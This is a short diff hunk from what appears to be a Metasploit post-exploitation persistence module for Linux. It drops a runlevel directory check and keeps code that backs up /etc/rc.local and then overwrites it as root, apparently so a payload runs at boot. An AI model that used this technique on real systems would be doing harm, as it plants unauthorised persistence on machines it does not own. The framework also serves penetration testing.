@@ -267,11 +267,7 @@ class Metasploit3 < Msf::Post
 				print_error("Only root user is allowded for this startup type")
 				return false
 			end
-			runlevel = cmd_exec('runlevel').scan(/[0-9]*$/)[0].gsub("\n", '')
-			rc_dir = "/etc/rc#{runlevel}.d"
-			unless directory_exist? rc_dir
-				print_error("The rc directory does not exists : #{rc_dir}")
-			end
+
 			rc_temp = '/etc/rc.local' + ::Rex::Text.rand_text_alpha((rand(4)+6))
 			cmd_exec('cp /etc/rc.local ' + rc_temp)
 			cmd_exec('echo "#!/bin/sh" > /etc/rc.local' )
